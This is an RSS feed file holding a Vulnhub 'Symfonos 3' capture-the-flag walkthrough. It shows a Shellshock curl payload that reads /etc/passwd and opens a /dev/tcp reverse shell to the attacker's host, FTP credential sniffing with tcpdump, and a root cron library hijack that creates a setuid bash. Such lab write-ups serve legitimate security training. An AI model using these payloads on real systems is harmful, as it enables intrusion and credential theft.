@@ -1,0 +1,172 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tcpdump on ikuamike</title>
+    <link>https://blog.ikuamike.io/tags/tcpdump/</link>
+    <description>Recent content in Tcpdump on ikuamike</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Michael Ikua</copyright>
+    <lastBuildDate>Thu, 11 Feb 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/tcpdump/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnhub: Symfonos 3</title>
+      <link>https://blog.ikuamike.io/posts/2021/symfonos3/</link>
+      <pubDate>Thu, 11 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/symfonos3/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Difficulty&lt;/th&gt;
+&lt;th&gt;Release Date&lt;/th&gt;
+&lt;th&gt;Author&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Intermediate&lt;/td&gt;
+&lt;td&gt;7 Apr 2020&lt;/td&gt;
+&lt;td&gt;Zayotic&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;In this box, we need to perform some directory bruteforce then use shellshock vulnerability to get our first shell.
+We then sniff local traffic using tcpdump and get credentials for the next user who has permissions to write python2.7 lib
+directory. Using those write permissions we hijack a library that is imported in a script that is executed by root in a
+cron job. We create a suid bash binary that we use to get a root shell.&lt;/p&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;Nmap&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-nmap&#34; data-lang=&#34;nmap&#34;&gt;Nmap scan report for 192.168.191.130
+Host is up (0.00025s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5b
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
+|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
+|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn&#39;t have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
+&lt;p&gt;Visiting the IP on the browser, all we get is a picture.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Viewing the source doesn&amp;rsquo;t reveal much.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Going to the research endpoint, there&amp;rsquo;s information about the Underworld and Greek mythology.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Some of the words look similar to the directories we discovered, so let&amp;rsquo;s create a wordlist which maybe helpful later.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The current directories we have discovered don&amp;rsquo;t have much in them. At this point I was stuck a bit, after looking at
+some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
+with a trailing slash.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I&amp;rsquo;ll use going forward. The presence of
+cgi-bin could potentially mean we can have a shellshock vulnerability.&lt;/p&gt;
+&lt;p&gt;Running another bruteforce using the wordlist I created earlier didn&amp;rsquo;t work. I then thought to get a lowercase version of the
+words and try it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt
+
+ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;With the lowercase wordlist, we get underworld.&lt;/p&gt;
+&lt;p&gt;To verify the shellshock vulnerability, we can send this request.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;curl -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;cat /etc/passwd&amp;#39;&amp;#34;&lt;/span&gt; http://192.168.191.130/cgi-bin/underworld
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-cerberus&#34;&gt;Shell as cerberus&lt;/h1&gt;
+&lt;p&gt;After verifying this vulnerability, we can get a reverse shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;curl -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt; http://192.168.191.130/cgi-bin/underworld
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
+command.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;find / -group pcap -ls 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;This reveals we can run tcpdump, therefore we can sniff network traffic.&lt;/p&gt;
+&lt;p&gt;Before sniffing traffic, I used &lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;pspy&lt;/a&gt;
+
+ to check for cron jobs and other commands being executed.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I&amp;rsquo;ll sniff ftp
+traffic which isn&amp;rsquo;t typically encrypted.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;tcpdump port &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; -n -i lo -A
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.&lt;/p&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;Using the credentials we login to ssh as hades, running id reveals hades is in gods group.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Running find again reveals we have write permissions to /usr/lib/python2.7 folder.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;find / -group gods -ls 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
+any imports in that ftpclient.py script.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Since ftplib is imported, we&amp;rsquo;ll replace ftplib.py with this script&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
+
+os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span&gt;)
+os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chmod +s /tmp/bash&amp;#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;This will create a setuid bash binary in /tmp. Which can use to gain root privileges.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
